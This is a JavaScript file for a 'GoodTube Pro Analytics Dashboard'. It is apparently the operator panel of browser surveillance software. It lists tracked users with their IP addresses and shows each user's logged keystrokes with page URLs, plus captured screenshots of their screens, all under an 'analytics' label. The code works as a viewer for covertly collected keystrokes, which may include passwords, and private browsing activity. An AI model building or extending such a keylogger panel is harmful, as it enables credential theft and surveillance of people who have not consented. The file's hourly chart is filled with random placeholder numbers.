// GoodTube Pro Analytics Dashboard JavaScript

class AnalyticsDashboard {
    constructor() {
        this.currentTab = 'overview';
        this.refreshInterval = null;
        this.chart = null;
        this.init();
    }

    init() {
        this.loadInitialData();
        this.setupEventListeners();
        this.startAutoRefresh();
    }

    setupEventListeners() {
        // Tab switching
        document.querySelectorAll('.tab-button').forEach(button => {
            button.addEventListener('click', (e) => {
                const tabName = e.target.closest('.tab-button').onclick.toString().match(/showTab\('(.+?)'\)/)[1];
                this.showTab(tabName);
            });
        });

        // Modal close events
        document.addEventListener('click', (e) => {
            if (e.target.classList.contains('modal')) {
                this.closeAllModals();
            }
        });

        // Filter events
        const eventFilter = document.getElementById('eventFilter');
        const eventTypeFilter = document.getElementById('eventTypeFilter');
        
        if (eventFilter) {
            eventFilter.addEventListener('input', () => this.filterEvents());
        }
        
        if (eventTypeFilter) {
            eventTypeFilter.addEventListener('change', () => this.filterEvents());
        }
    }

    async loadInitialData() {
        await this.loadStats();
        await this.loadRecentActivity();
        await this.loadUsers();
        this.initChart();
    }

    async loadStats() {
        try {
            const response = await fetch('/api/stats');
            const data = await response.json();
            
            document.getElementById('totalUsers').textContent = data.totalUsers || 0;
            document.getElementById('activeSessions').textContent = data.activeSessions || 0;
            document.getElementById('totalEvents').textContent = data.totalEvents || 0;
            document.getElementById('totalScreenshots').textContent = data.totalScreenshots || 0;
            
        } catch (error) {
            console.error('Error loading stats:', error);
            this.showError('Failed to load statistics');
        }
    }

    async loadRecentActivity() {
        try {
            const response = await fetch('/api/stats');
            const data = await response.json();
            const container = document.getElementById('recentActivity');
            
            if (!data.recentEvents || data.recentEvents.length === 0) {
                container.innerHTML = '<div class="loading">No recent activity</div>';
                return;
            }
            
            const html = data.recentEvents.map(event => `
                <div class="activity-item fade-in">
                    <div class="activity-icon">
                        <i class="fas ${this.getEventIcon(event.event_type)}"></i>
                    </div>
                    <div class="activity-content">
                        <h4>${this.formatEventType(event.event_type)}</h4>
                        <p>User: ${event.user_id} • ${this.truncateUrl(event.url || 'N/A')}</p>
                    </div>
                    <div class="activity-time">
                        ${this.formatTime(event.timestamp)}
                    </div>
                </div>
            `).join('');
            
            container.innerHTML = html;
            
        } catch (error) {
            console.error('Error loading recent activity:', error);
            document.getElementById('recentActivity').innerHTML = 
                '<div class="loading">Failed to load activity</div>';
        }
    }

    async loadUsers() {
        try {
            const response = await fetch('/api/users');
            const data = await response.json();
            const tbody = document.querySelector('#usersTable tbody');
            
            if (!data.users || data.users.length === 0) {
                tbody.innerHTML = '<tr><td colspan="8" class="loading">No users found</td></tr>';
                return;
            }
            
            const html = data.users.map(user => `
                <tr class="fade-in">
                    <td><strong>${user.user_id}</strong></td>
                    <td>${user.ip_address || 'N/A'}</td>
                    <td><span class="badge">${user.session_count || 0}</span></td>
                    <td><span class="badge">${user.event_count || 0}</span></td>
                    <td><span class="badge">${user.keystroke_count || 0}</span></td>
                    <td><span class="badge">${user.screenshot_count || 0}</span></td>
                    <td>${this.formatTime(user.last_seen)}</td>
                    <td>
                        <button class="btn btn-sm btn-primary" onclick="dashboard.showUserDetails('${user.user_id}')">
                            <i class="fas fa-eye"></i> View
                        </button>
                    </td>
                </tr>
            `).join('');
            
            tbody.innerHTML = html;
            
        } catch (error) {
            console.error('Error loading users:', error);
            document.querySelector('#usersTable tbody').innerHTML = 
                '<tr><td colspan="8" class="loading">Failed to load users</td></tr>';
        }
    }

    async showUserDetails(userId) {
        try {
            const response = await fetch(`/api/user/${userId}`);
            const data = await response.json();
            
            const modal = document.getElementById('userModal');
            const modalBody = document.getElementById('userModalBody');
            
            const html = `
                <div class="user-details">
                    <div class="user-info">
                        <h4><i class="fas fa-user"></i> User Information</h4>
                        <div class="info-grid">
                            <div class="info-item">
                                <label>User ID:</label>
                                <span>${data.user.user_id}</span>
                            </div>
                            <div class="info-item">
                                <label>IP Address:</label>
                                <span>${data.user.ip_address || 'N/A'}</span>
                            </div>
                            <div class="info-item">
                                <label>Browser:</label>
                                <span>${this.parseBrowser(data.user.user_agent)}</span>
                            </div>
                            <div class="info-item">
                                <label>First Seen:</label>
                                <span>${this.formatTime(data.user.first_seen)}</span>
                            </div>
                            <div class="info-item">
                                <label>Last Seen:</label>
                                <span>${this.formatTime(data.user.last_seen)}</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="user-activity">
                        <h4><i class="fas fa-chart-line"></i> Recent Activity</h4>
                        <div class="activity-tabs">
                            <button class="tab-btn active" onclick="dashboard.showUserTab('events')">Events</button>
                            <button class="tab-btn" onclick="dashboard.showUserTab('keystrokes')">Keystrokes</button>
                            <button class="tab-btn" onclick="dashboard.showUserTab('screenshots')">Screenshots</button>
                        </div>
                        
                        <div id="user-events" class="user-tab-content active">
                            ${this.renderUserEvents(data.events)}
                        </div>
                        
                        <div id="user-keystrokes" class="user-tab-content">
                            ${this.renderUserKeystrokes(data.keystrokes)}
                        </div>
                        
                        <div id="user-screenshots" class="user-tab-content">
                            ${this.renderUserScreenshots(data.screenshots)}
                        </div>
                    </div>
                </div>
            `;
            
            modalBody.innerHTML = html;
            modal.classList.add('active');
            
        } catch (error) {
            console.error('Error loading user details:', error);
            this.showError('Failed to load user details');
        }
    }

    renderUserEvents(events) {
        if (!events || events.length === 0) {
            return '<div class="loading">No events found</div>';
        }
        
        return `
            <div class="events-list">
                ${events.slice(0, 20).map(event => `
                    <div class="event-item">
                        <div class="event-details">
                            <h4>${this.formatEventType(event.event_type)}</h4>
                            <p>${this.truncateUrl(event.url || 'N/A')}</p>
                        </div>
                        <div class="event-time">${this.formatTime(event.timestamp)}</div>
                    </div>
                `).join('')}
            </div>
        `;
    }

    renderUserKeystrokes(keystrokes) {
        if (!keystrokes || keystrokes.length === 0) {
            return '<div class="loading">No keystrokes found</div>';
        }
        
        return `
            <div class="keystrokes-list">
                ${keystrokes.slice(0, 50).map(keystroke => `
                    <div class="keystroke-item">
                        <span class="keystroke-key">${this.escapeHtml(keystroke.keystroke)}</span>
                        <span class="keystroke-url">${this.truncateUrl(keystroke.url || 'N/A')}</span>
                        <span class="keystroke-time">${this.formatTime(keystroke.timestamp)}</span>
                    </div>
                `).join('')}
            </div>
        `;
    }

    renderUserScreenshots(screenshots) {
        if (!screenshots || screenshots.length === 0) {
            return '<div class="loading">No screenshots found</div>';
        }
        
        return `
            <div class="screenshots-grid">
                ${screenshots.map(screenshot => `
                    <div class="screenshot-thumb" onclick="dashboard.showScreenshot('${screenshot.filename}', '${screenshot.url}', '${screenshot.timestamp}')">
                        <img src="/api/screenshots/${screenshot.filename}" alt="Screenshot">
                        <div class="screenshot-overlay">
                            <i class="fas fa-expand"></i>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    }

    showScreenshot(filename, url, timestamp) {
        const modal = document.getElementById('screenshotModal');
        const image = document.getElementById('screenshotImage');
        const info = document.getElementById('screenshotInfo');
        
        image.src = `/api/screenshots/${filename}`;
        info.innerHTML = `
            <p><strong>URL:</strong> ${url || 'N/A'}</p>
            <p><strong>Timestamp:</strong> ${this.formatTime(timestamp)}</p>
            <p><strong>Filename:</strong> ${filename}</p>
        `;
        
        modal.classList.add('active');
    }

    showUserTab(tabName) {
        document.querySelectorAll('.user-tab-content').forEach(tab => {
            tab.classList.remove('active');
        });
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.classList.remove('active');
        });
        
        document.getElementById(`user-${tabName}`).classList.add('active');
        event.target.classList.add('active');
    }

    initChart() {
        const ctx = document.getElementById('chartCanvas');
        if (!ctx) return;
        
        this.chart = new Chart(ctx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'Events per Hour',
                    data: [],
                    borderColor: '#8B5CF6',
                    backgroundColor: 'rgba(139, 92, 246, 0.1)',
                    tension: 0.4,
                    fill: true
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        labels: {
                            color: '#F8FAFC'
                        }
                    }
                },
                scales: {
                    x: {
                        ticks: {
                            color: '#CBD5E1'
                        },
                        grid: {
                            color: 'rgba(255, 255, 255, 0.1)'
                        }
                    },
                    y: {
                        ticks: {
                            color: '#CBD5E1'
                        },
                        grid: {
                            color: 'rgba(255, 255, 255, 0.1)'
                        }
                    }
                }
            }
        });
        
        this.updateChart();
    }

    async updateChart() {
        // This would fetch hourly event data and update the chart
        // For now, we'll use dummy data
        const hours = [];
        const data = [];
        
        for (let i = 23; i >= 0; i--) {
            const hour = new Date();
            hour.setHours(hour.getHours() - i);
            hours.push(hour.toLocaleTimeString('en-US', { hour: '2-digit' }));
            data.push(Math.floor(Math.random() * 100));
        }
        
        if (this.chart) {
            this.chart.data.labels = hours;
            this.chart.data.datasets[0].data = data;
            this.chart.update();
        }
    }

    filterEvents() {
        const filter = document.getElementById('eventFilter').value.toLowerCase();
        const typeFilter = document.getElementById('eventTypeFilter').value;
        
        // This would filter the events in the events tab
        // Implementation depends on how events are loaded and displayed
    }

    startAutoRefresh() {
        this.refreshInterval = setInterval(() => {
            this.loadStats();
            if (this.currentTab === 'overview') {
                this.loadRecentActivity();
            }
        }, 30000); // Refresh every 30 seconds
    }

    stopAutoRefresh() {
        if (this.refreshInterval) {
            clearInterval(this.refreshInterval);
        }
    }

    closeAllModals() {
        document.querySelectorAll('.modal').forEach(modal => {
            modal.classList.remove('active');
        });
    }

    closeUserModal() {
        document.getElementById('userModal').classList.remove('active');
    }

    closeScreenshotModal() {
        document.getElementById('screenshotModal').classList.remove('active');
    }

    showError(message) {
        // Simple error notification
        const notification = document.createElement('div');
        notification.className = 'error-notification';
        notification.textContent = message;
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #EF4444;
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 0.5rem;
            z-index: 10000;
            animation: slideIn 0.3s ease-out;
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.remove();
        }, 5000);
    }

    // Utility functions
    getEventIcon(eventType) {
        const icons = {
            'keystroke': 'fa-keyboard',
            'click': 'fa-mouse-pointer',
            'navigation': 'fa-compass',
            'screenshot': 'fa-camera',
            'scroll': 'fa-arrows-alt-v',
            'focus': 'fa-eye',
            'blur': 'fa-eye-slash'
        };
        return icons[eventType] || 'fa-circle';
    }

    formatEventType(eventType) {
        return eventType.charAt(0).toUpperCase() + eventType.slice(1).replace('_', ' ');
    }

    formatTime(timestamp) {
        if (!timestamp) return 'N/A';
        return new Date(timestamp).toLocaleString();
    }

    truncateUrl(url, maxLength = 50) {
        if (!url || url === 'N/A') return 'N/A';
        return url.length > maxLength ? url.substring(0, maxLength) + '...' : url;
    }

    parseBrowser(userAgent) {
        if (!userAgent) return 'Unknown';
        
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        
        return 'Unknown';
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
}

// Global functions for HTML onclick handlers
function showTab(tabName) {
    dashboard.currentTab = tabName;
    
    // Update tab buttons
    document.querySelectorAll('.tab-button').forEach(btn => {
        btn.classList.remove('active');
    });
    document.querySelector(`[onclick="showTab('${tabName}')"]`).classList.add('active');
    
    // Update tab content
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById(`${tabName}-tab`).classList.add('active');
    
    // Load tab-specific data
    if (tabName === 'users') {
        dashboard.loadUsers();
    } else if (tabName === 'overview') {
        dashboard.loadRecentActivity();
    }
}

function refreshData() {
    dashboard.loadInitialData();
}

async function exportData() {
    try {
        const response = await fetch('/api/export');
        const data = await response.json();
        
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `goodtube-analytics-${new Date().toISOString().split('T')[0]}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        URL.revokeObjectURL(url);
        
    } catch (error) {
        console.error('Error exporting data:', error);
        dashboard.showError('Failed to export data');
    }
}

function closeUserModal() {
    dashboard.closeUserModal();
}

function closeScreenshotModal() {
    dashboard.closeScreenshotModal();
}

// Initialize dashboard when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.dashboard = new AnalyticsDashboard();
});

